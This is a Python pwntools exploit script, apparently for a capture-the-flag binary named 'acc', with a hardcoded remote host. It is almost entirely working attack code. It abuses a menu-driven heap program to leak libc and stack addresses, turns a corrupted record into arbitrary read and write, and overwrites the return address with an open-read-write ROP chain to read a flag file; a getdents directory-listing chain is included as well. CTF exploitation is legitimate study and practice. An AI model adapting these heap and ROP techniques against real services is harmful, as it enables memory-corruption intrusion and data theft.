#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen

from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './acc_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "65.109.199.182", 13373


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
# b *puts+121
b *_IO_flush_all
b *read+25
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if (not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB):
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def orw(addr, path=None):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
    if path:
        mov_qword_ptr_rsi = next(libc.search(asm("mov qword ptr [rsi], rax ; ret")))
        path = path.ljust((len(path) + 7) & ~7, b"\x00")
        chunks = [path[i:i+8] for i in range(0, len(path), 8)]
        for i, chunk in enumerate(chunks):
            rop.rsi = addr + i * 8
            rop.rax = chunk
            rop.call(mov_qword_ptr_rsi_rax)

    # Open
    rop.rax = constants.SYS_open
    rop.call(syscall, [addr, 0])
    rop.raw(mov_rdi_rax)

    # #OpenAt
    # rop.rax = constants.SYS_openat
    # rop.call(syscall, [-100, libc.bss(), 0])
    # rop.raw(mov_rdi_rax)

    #Read
    rop.rax = constants.SYS_read
    rop(rsi=addr)
    rop.raw(syscall)
    #Write
    rop.rax = constants.SYS_write
    rop.call(syscall, [1])
    return rop.chain()

def ropgetdent(addr):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
    add_rdx_rax = nsa(libc, "add edx, eax; mov rax, rdx ; pop rbx ; ret")
    xor_rdx = nsa(libc, "xor edx, edx ; mov eax, edx ; ret") 
    rop.rax = constants.SYS_open
    rop.call(syscall, [addr, 0])
    rop.raw(mov_rdi_rax)
    rop.rax = 0x100
    rop.raw(add_rdx_rax)
    rop.raw(0xdeadbeef) #pop rbx
    rop.rsi = addr

    rop.rax = constants.SYS_getdents64
    rop.raw(p64(syscall))           
    rop.rax = constants.SYS_write
    rop.call(syscall, [1])
    return rop.chain()

def menu(op):
    sla(b"> ", str(op).encode())

def register(username, bio):
    menu(1)
    sla(b"username: ", username)
    sla(": ", str(len(bio)).encode())
    sla(b": ", bio)

def edit(idx, bio):
    menu(2)
    sla(b": ", str(idx).encode())
    sla(b": ", bio)

def rename(idx, username):
    menu(3)
    sla(b": ", str(idx).encode())
    sla(b": ", username)

def view(idx):
    menu(4)
    sla(b": ", str(idx).encode())

def free(idx):
    menu(5)
    sla(b": ", str(idx).encode())

def list_idx():
    menu(6)

def read(where, size):
    edit(7, p32(0x12) + b"Z"*36 +  p64(size) + p64(where))
    view(6)

def write(where, what):
    edit(7, p32(0x12) + b"Z"*36 +  p64(len(what)) + p64(where))
    debug()
    edit(6, what)



def exploit():
    global io
    io = initialize()
    with log.progress("Leak libc"), context.silent:
        register(b"dummy", b"B"*0x828)
        register(b"dummy1", b"B"*0x828)
        register(b"dummy2", b"B"*0x828)
        free(1)
        register(b"A", b"B")
        register(b"A", b"B"*0x420)
        register(b"C", b"E"*0x420)
        free(3)
        view(4)
        ru(": ")
        libc_leak = u64(r(8))
        libc.address = libc_leak - (libc.sym["main_arena"] + 96)
    leak("Libc leak", hex(libc_leak))
    leak("Libc base address", hex(libc.address))
    with log.progress("Gain arbitary read & write"):
        register(b"E", b"C"*0x38)
        register(b"F", b"D")
        register(b"F", b"E"*0x38)
        free(3)
        register(b"G", b"A")
        register(b"H", p32(0x12) + b"Z"*36 +  p64(0x8) + p64(libc.sym["environ"]))
        view(6)
        ru(": ")
        stack_leak = u64(r(8))
        ret = stack_leak - 0x1a0
    leak("Stack leak", hex(stack_leak))
    leak("Ret", hex(ret))
    with log.progress("ROP chain ORW"):
        # write(ret, ropgetdent(stack_leak-0xf0) + b".\0") # getdents on "."
        filename = b"flag-2583a02920a04a40c8f817f5d7c2bff3\0"
        write(ret, orw(stack_leak-0x110) + filename)

    io.interactive()

if __name__ == '__main__':
    exploit()